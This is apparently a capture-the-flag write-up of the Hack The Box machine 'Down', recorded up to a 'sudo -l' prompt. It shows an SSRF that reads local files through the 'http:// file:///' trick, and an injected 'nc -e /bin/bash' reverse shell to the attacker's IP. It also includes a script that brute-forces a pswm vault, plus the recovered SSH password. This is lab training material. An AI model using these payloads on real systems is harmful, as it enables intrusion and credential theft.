Target : 10.129.234.87

Date : 27/05/2026

```bash
>  echo "10.129.234.87 down.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.87 down.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.234.87  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 10:20 +0200  
Warning: 10.129.234.87 giving up on port because retransmission cap hit (10).  
Nmap scan report for down.htb (10.129.234.87)  
Host is up (0.063s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)  
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)  
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))  
|_http-title: Is it down or just me?  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
Device type: general purpose|router  
Running: Linux 5.X, MikroTik RouterOS 7.X  
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3  
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 50.83 seconds
```

We see that there are only two open ports : http `80/tcp` and ssh `22/tcp`.

```bash
>  curl -sL http://10.129.234.87  
<!DOCTYPE html>  
<html lang="en">  
<head>  
   <meta charset="UTF-8">  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
   <title>Is it down or just me?</title>  
   <link rel="stylesheet" href="style.css">  
</head>  
<body>  
  
   <header>  
       <img src="/logo.png" alt="Logo">  
       <h2>Is it down or just me?</h2>  
   </header>  
  
   <div class="container">  
  
<h1>Is that website down, or is it just you?</h1>  
       <form id="urlForm" action="index.php" method="POST">  
           <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>  
           <button type="submit">Is it down?</button>  
       </form>  
</div>  
</div>  
<footer>© 2024 isitdownorjustme LLC</footer>  
</body>  
</html>
```

Nothing interesting here.

```bash
>  gobuster dir -u http://down.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt  
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://down.htb  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
.hta                 (Status: 403) [Size: 273]  
.htaccess            (Status: 403) [Size: 273]  
.htpasswd            (Status: 403) [Size: 273]  
index.php            (Status: 200) [Size: 739]  
javascript           (Status: 301) [Size: 309] [--> http://down.htb/javascript/]  
server-status        (Status: 403) [Size: 273]  
Progress: 4751 / 4751 (100.00%)  
===============================================================  
Finished  
===============================================================

>  curl -sL http://down.htb/javascript  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
<html><head>  
<title>403 Forbidden</title>  
</head><body>  
<h1>Forbidden</h1>  
<p>You don't have permission to access this resource.</p>  
<hr>  
<address>Apache/2.4.52 (Ubuntu) Server at down.htb Port 80</address>  
</body></html>
```

The web server is running on `Apache httpd 2.4.52` with `MikroTik RouterOS 7.2 - 7.5`

```bash
> searchsploit Apache
```

We find by looking at the http results :

```
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50383.sh  
Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50406.sh  
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2) | multiple/webapps/50446.sh  
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3) | multiple/webapps/50512.py  
Apache Httpd mod_proxy - Error Page Cross-Site Scripting  | multiple/webapps/47688.md
```

```bash
> msfconsole -q
msf > search Apache httpd  
  
Matching Modules  
================  
  
  #   Name                                                         Disclosure Date  Rank       Check  Description  
  -   ----                                                         ---------------  ----       -----  -----------  
  0   exploit/multi/http/apache_normalize_path_rce                 2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE  
  1     \_ target: Automatic (Dropper)                             .                .          .      .  
  2     \_ target: Unix Command (In-Memory)                        .                .          .      .  
  3   auxiliary/scanner/http/apache_normalize_path                 2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner  
  4     \_ action: CHECK_RCE                                       .                .          .      Check for RCE (if mod_cgi is enabled).  
  5     \_ action: CHECK_TRAVERSAL                                 .                .          .      Check for vulnerability.  
  6     \_ action: READ_FILE                                       .                .          .      Read file on the remote server.  
  7   auxiliary/scanner/http/mod_negotiation_brute                 .                normal     No     Apache HTTPD mod_negotiation Filename Bruter  
  8   auxiliary/scanner/http/mod_negotiation_scanner               .                normal     No     Apache HTTPD mod_negotiation Scanner  
  9   exploit/windows/http/apache_chunked                          2002-06-19       good       Yes    Apache Win32 Chunked Encoding  
  10    \_ target: Windows Generic Bruteforce                      .                .          .      .  
  11    \_ target: Apache.org Build 1.3.9->1.3.19                  .                .          .      .  
  12    \_ target: Apache.org Build 1.3.22->1.3.24                 .                .          .      .  
  13    \_ target: Apache.org Build 1.3.19->1.3.24                 .                .          .      .  
  14    \_ target: Apache.org Build 1.3.22                         .                .          .      .  
  15    \_ target: Apache.org Build 1.3.17->1.3.24 (Windows 2000)  .                .          .      .  
  16    \_ target: Apache.org Build 1.3.17->1.3.24 (Windows NT)    .                .          .      .  
  17    \_ target: Windows 2003 English SP0                        .                .          .      .  
  18    \_ target: Windows 2000 English                            .                .          .      .  
  19    \_ target: Oracle 8.1.7 Apache 1.3.12                      .                .          .      .  
  20    \_ target: Oracle 9.1.0 Apache 1.3.12                      .                .          .      .  
  21    \_ target: Oracle 9.2.0 Apache 1.3.22                      .                .          .      .  
  22    \_ target: Debugging Target                                .                .          .      .  
  23  exploit/unix/webapp/wp_phpmailer_host_header                 2017-05-03       average    Yes    WordPress PHPMailer Host Header Command Injection  
  24  exploit/unix/webapp/jquery_file_upload                       2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload  
  25    \_ target: PHP Dropper                                     .                .          .      .  
  26    \_ target: Linux Dropper                                   .                .          .      .  
  
  
Interact with a module by name or index. For example info 26, use 26 or use exploit/unix/webapp/jquery_file_upload  
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'  
  
msf > use 0  
[*] Using configured payload linux/x64/meterpreter/reverse_tcp  
msf exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 10.129.234.87  
RHOSTS => 10.129.234.87  
msf exploit(multi/http/apache_normalize_path_rce) > set RPORT 80  
RPORT => 80  
msf exploit(multi/http/apache_normalize_path_rce) > set LHOST 10.10.14.12  
LHOST => 10.10.14.12  
msf exploit(multi/http/apache_normalize_path_rce) > set LPORT 4444  
LPORT => 4444  
msf exploit(multi/http/apache_normalize_path_rce) > run  
[*] Started reverse TCP handler on 10.10.14.12:4444    
[*] Using auxiliary/scanner/http/apache_normalize_path as check  
[*] Error: 10.129.234.87: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=10.129.234.87:80 state=SSLv3/TLS write client hello: wrong version number  
[*] Scanned 1 of 1 hosts (100% complete)  
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable.
```

Didn't work.

We try to look for other attack vectors, starting with fuzzing with a bigger list :

```bash
>  ffuf -u "http://down.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 404  
  
       /'___\  /'___\           /___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://down.htb/FUZZ  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response status: 404  
________________________________________________  
  
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 86ms]  
.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 93ms]  
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 90ms]  
.                       [Status: 200, Size: 739, Words: 131, Lines: 28, Duration: 74ms]  
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 177ms]  
.htm                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 4734ms]  
.phtml                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 139ms]  
.htc                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 145ms]  
.html_var_DE            [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 75ms]  
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 90ms]  
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 82ms]  
.html.                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 74ms]  
.html.html              [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 104ms]  
.htpasswds              [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 83ms]  
.htm.                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 78ms]  
.htmll                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 76ms]  
.phps                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 82ms]  
.html.old               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 74ms]  
.ht                     [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 63ms]  
.html.bak               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 63ms]  
.htm.htm                [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 80ms]  
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 67ms]  
.html1                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 66ms]  
.htgroup                [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 71ms]  
.html.LCK               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 64ms]  
.html.printable         [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 64ms]  
.htm.LCK                [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 80ms]  
.htaccess.bak           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 85ms]  
.html.php               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 95ms]  
.htmls                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 95ms]  
.htx                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 95ms]  
.htlm                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 84ms]  
.htm2                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 84ms]  
.htuser                 [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 84ms]  
.html-                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 84ms]  
:: Progress: [43007/43007] :: Job [1/1] :: 526 req/sec :: Duration: [0:01:39] :: Errors: 0 ::

>  curl -si -X POST "http://down.htb/index.php" --data "url=http://10.10.14.12/"  
  
HTTP/1.1 200 OK  
Date: Wed, 27 May 2026 10:00:36 GMT  
Server: Apache/2.4.52 (Ubuntu)  
Vary: Accept-Encoding  
Content-Length: 836  
Content-Type: text/html; charset=UTF-8  
  
<!DOCTYPE html>  
<html lang="en">  
<head>  
   <meta charset="UTF-8">  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
   <title>Is it down or just me?</title>  
   <link rel="stylesheet" href="style.css">  
</head>  
<body>  
  
   <header>  
       <img src="/logo.png" alt="Logo">  
       <h2>Is it down or just me?</h2>  
   </header>  
  
   <div class="container">  
  
<h1>Is that website down, or is it just you?</h1>  
       <form id="urlForm" action="index.php" method="POST">  
           <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>  
           <button type="submit">Is it down?</button>  
       </form><div class="output" id="outputSection"><font size=+1>It is down for everyone! 😔</font><br><br>  
</div>  
</div>  
<footer>© 2024 isitdownorjustme LLC</footer>  
</body>  
</html>
```

So the website is... down.

We're going to listen on port 80 :

```bash
>  sudo nc -lvnp 80  
  
Please touch the FIDO authenticator.  
Listening on 0.0.0.0 80
```

And POST to the url :

```bash
curl -s -X POST "http://down.htb/index.php" --data "url=http://10.10.14.12/"
```

The listener received it :

```bash
Connection received on 10.129.234.87 47838  
GET / HTTP/1.1  
Host: 10.10.14.12  
User-Agent: curl/7.81.0  
Accept: */*
```

Then, we'll fuzz index.php for parameters :

```bash
>  ffuf -u "http://down.htb/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404 -fs 739  
  
       /'___\  /'___\           /___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://down.htb/index.php?FUZZ=test  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response status: 404  
:: Filter           : Response size: 739  
________________________________________________  
  
:: Progress: [6453/6453] :: Job [1/1] :: 218 req/sec :: Duration: [0:00:25] :: Errors: 0 ::

>  ffuf -u "http://down.htb/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -fc 404 -fs 739  
  
       /'___\  /'___\           /___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://down.htb/index.php?FUZZ=test  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response status: 404  
:: Filter           : Response size: 739  
________________________________________________  
  
:: Progress: [211/211] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Nothing.

We then try fuzzing for subdomains :

```bash
>  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://down.htb:80/ -H "Host: FUZZ.down.htb" -fc 404 -fs 739  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://down.htb:80/  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  
:: Header           : Host: FUZZ.down.htb  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response status: 404  
:: Filter           : Response size: 739  
________________________________________________  
  
:: Progress: [20000/20000] :: Job [1/1] :: 581 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

Still nothing.

We try parameters manually :

```bash   
>  curl -s "http://down.htb/index.php?debug=1" | wc -c  
  
739  
>  curl -s "http://down.htb/index.php?test=1" | wc -c  
  
739  
>  curl -s "http://down.htb/index.php?post=1" | wc -c  
  
739  
>  curl -s "http://down.htb/index.php" | wc -c  
  
739
```

Since we got a positive response from the listener on port 80 :

```bash
Listening on 0.0.0.0 80  
Connection received on 10.129.234.87 53556  
GET / HTTP/1.1  
Host: 10.10.14.12  
User-Agent: curl/7.81.0  
Accept: */*
```

We'll try to POST using the listener, making it spit the /etc/passwd file :

```bash
for u in \

"http://10.10.14.12/" \

"http://127.0.0.1/" \

"http://localhost/" \

"file:///etc/passwd" \

"file:///etc/hosts" \

; do

echo "===== $u ====="

curl -s -X POST "http://down.htb/index.php" --data-urlencode "url=$u" \

| sed -n '/<div class="output"/,/<\/div>/p'

echo

done
```

```bash
>  curl -s -X POST "http://down.htb/index.php" \  
 --data-urlencode "url=http:// file:///etc/passwd" \  
 | sed -n '/<div class="output"/,/<\/div>/p'  
       </form><div class="output" id="outputSection"><font size=+1>It is up. It's just you! 😝</font><br><br><p id="outputDetails"><pre>root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
pollinate:x:105:1::/var/cache/pollinate:/bin/false  
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin  
syslog:x:107:113::/home/syslog:/usr/sbin/nologin  
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin  
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false  
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin  
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin  
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  
aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash  
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false  
_laurel:x:998:998::/var/log/laurel:/bin/false</pre></p>  
</div>
```

And we got a lot of stuff.

We then try to get /var/www/html/index.php :

```bash
>  curl -s -X POST "http://down.htb/index.php" \  
 --data-urlencode "url=http:// file:///var/www/html/index.php" \  
 | sed -n '/<pre>/,/<\/pre>/p' | sed '1d;$d'  
&lt;html lang=&quot;en&quot;&gt;  
&lt;head&gt;  
   &lt;meta charset=&quot;UTF-8&quot;&gt;  
   &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  
   &lt;title&gt;Is it down or just me?&lt;/title&gt;  
   &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;  
&lt;/head&gt;  
&lt;body&gt;  
  
   &lt;header&gt;  
       &lt;img src=&quot;/logo.png&quot; alt=&quot;Logo&quot;&gt;  
       &lt;h2&gt;Is it down or just me?&lt;/h2&gt;  
   &lt;/header&gt;  
  
   &lt;div class=&quot;container&quot;&gt;  
  
&lt;?php  
if ( isset($_GET[&#039;expertmode&#039;]) &amp;&amp; $_GET[&#039;expertmode&#039;] === &#039;tcp&#039; ) {  
 echo &#039;&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;  
       &lt;form id=&quot;urlForm&quot; action=&quot;index.php?expertmode=tcp&quot; method=&quot;POST&quot;&gt;  
           &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;ip&quot; placeholder=&quot;Please enter an IP.&quot; required&gt;&lt;br&gt;  
           &lt;input type=&quot;number&quot; id=&quot;port&quot; name=&quot;port&quot; placeholder=&quot;Please enter a port number.&quot; required&gt;&lt;br&gt;  
           &lt;button type=&quot;submit&quot;&gt;Is it refused?&lt;/button&gt;  
       &lt;/form&gt;&#039;;  
} else {  
 echo &#039;&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;  
       &lt;form id=&quot;urlForm&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;  
           &lt;input type=&quot;url&quot; id=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;Please enter a URL.&quot; required&gt;&lt;br&gt;  
           &lt;button type=&quot;submit&quot;&gt;Is it down?&lt;/button&gt;  
       &lt;/form&gt;&#039;;  
}  
  
if ( isset($_GET[&#039;expertmode&#039;]) &amp;&amp; $_GET[&#039;expertmode&#039;] === &#039;tcp&#039; &amp;&amp; isset($_POST[&#039;ip&#039;]) &amp;&amp; isset($_POST[&#039;port&#039;]) ) {  
 $ip = trim($_POST[&#039;ip&#039;]);  
 $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);  
 $port = trim($_POST[&#039;port&#039;]);  
 $port_int = intval($port);  
 $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);  
 if ( $valid_ip &amp;&amp; $valid_port ) {  
   $rc = 255; $output = &#039;&#039;;  
   $ec = escapeshellcmd(&quot;/usr/bin/nc -vz $ip $port&quot;);  
   exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);  
   echo &#039;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#039;;  
   if ( $rc === 0 ) {  
     echo &quot;&lt;font size=+1&gt;It is up. It&#039;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;  
     echo &#039;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#039;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#039;&lt;/pre&gt;&lt;/p&gt;&#039;;  
   } else {  
     echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;  
     echo &#039;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#039;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#039;&lt;/pre&gt;&lt;/p&gt;&#039;;  
   }  
 } else {  
   echo &#039;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#039;;  
   echo &#039;&lt;font color=red size=+1&gt;Please specify a correct IP and a port between 1 and 65535.&lt;/font&gt;&#039;;  
 }  
} elseif (isset($_POST[&#039;url&#039;])) {  
 $url = trim($_POST[&#039;url&#039;]);  
 if ( preg_match(&#039;|^https?://|&#039;,$url) ) {  
   $rc = 255; $output = &#039;&#039;;  
   $ec = escapeshellcmd(&quot;/usr/bin/curl -s $url&quot;);  
   exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);  
   echo &#039;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#039;;  
   if ( $rc === 0 ) {  
     echo &quot;&lt;font size=+1&gt;It is up. It&#039;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;  
     echo &#039;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#039;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#039;&lt;/pre&gt;&lt;/p&gt;&#039;;  
   } else {  
     echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;  
   }  
 } else {  
   echo &#039;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#039;;  
   echo &#039;&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;&#039;;  
 }  
}  
?&gt;  
  
&lt;/div&gt;  
&lt;/div&gt;  
&lt;footer&gt;© 2024 isitdownorjustme LLC&lt;/footer&gt;  
&lt;/body&gt;
```

We can read in the output :

`>  curl -s -X POST "http://down.htb/index.php?expertmode=tcp"`

And when we visit the website and put a random IP and port 80, it says `It is down for everyone`. When we put our tun VPN it says `It's up, it is just you`.

Which we will exploit :

```bash
>  curl -s -X POST "http://down.htb/index.php?expertmode=tcp" \  
 --data "ip=127.0.0.1&port=22" \  
 | sed -n '/<div class="output"/,/<\/div>/p'  
       </form><div class="output" id="outputSection"><font size=+1>It is up. It's just you! 😝</font><br><br><p id="outputDetails"><pre>localhost [127.0.0.1] 22 (ssh) open</pre></p>  
</div>
```

We open a listener :

```bash
> nc -lvnp 4444
```

And try a reverse shell with tcpdump :

```bash
>  sudo tcpdump -ni tun1 'host 10.129.234.87 and port 4444'  
  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode  
listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes
```

We try on port 443 :

```bash
nc -lvnp 443
```

```bash
>  sudo tcpdump -ni tun1 'host 10.129.234.87 and port 443'  
  
Please touch the FIDO authenticator.  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode  
listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes
```

```bash
>  curl --max-time 60 -s -X POST "http://down.htb/index.php?expertmode=tcp" \  
 --data "ip=127.0.0.1&port=22%0a/usr/bin/nc -e /bin/bash 10.10.14.12 443" \  
 | sed -n '/<pre>/,/<\/pre>/p'
```

But still no shell.

We recall `aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash` from /etc/passwd

```bash
>  curl -s -X POST "http://down.htb/index.php" \  
 --data-urlencode "url=http:// file:///home/aleks/.local/share/pswm/pswm" \  
 | sed -n '/<pre>/,/<\/pre>/p'  
       </form><div class="output" id="outputSection"><font size=+1>It is up. It's just you! 😝</font><br><br><p id="outputDetails"><pre>e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLgg  
w==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==</pre></p>
```

We save : `e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==`

```python
import cryptocode
blob = open("pswm").read().strip()
for line in open("/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt", errors="ignore"):
    master = line.strip()
    plain = cryptocode.decrypt(blob, master)
    if plain is not False and plain:
        print(f"[+] master: {master}")
        print(plain)
        break
```

```bash
>  python3 pwm.py  
[+] master: flower  
pswm    aleks   flower  
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E

>  ssh aleks@10.129.234.87  
The authenticity of host 10.129.234.87 (10.129.234.87)' can't be established.  
ED25519 key fingerprint is: SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.234.87' (ED25519) to the list of known hosts.  
(aleks@10.129.234.87) Password:    
(aleks@10.129.234.87) Password:    
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)  
  
System information as of Wed May 27 11:35:46 AM UTC 2026  
  
 System load:           0.0  
 Usage of /:            53.0% of 6.92GB  
 Memory usage:          7%  
 Swap usage:            0%  
 Processes:             227  
 Users logged in:       0  
 IPv4 address for eth0: 10.129.234.87  
 IPv6 address for eth0: dead:beef::a0de:adff:fe3a:d617  
Last login: Tue Jun 10 15:47:07 2025 from 10.10.14.67  
aleks@down:~$ ls -la /var/www/html/  
total 332  
drwxr-xr-x 2 root root   4096 Apr  8  2025 .  
drwxr-xr-x 3 root root   4096 Sep  6  2024 ..  
-rw-r--r-- 1 root root   3041 Sep  6  2024 index.php  
-rw-r--r-- 1 root root 316218 Sep  6  2024 logo.png  
-rw-r--r-- 1 root root   1794 Sep  6  2024 style.css  
-r--r--rw- 1 root root     33 Apr  8  2025 user_aeT1xa.txt
aleks@down:~$ cat /var/www/html/user_aeT1xa.txt  
[REDACTED]
```

And we got the user flag.

```bash
aleks@down:~$ sudo -l  
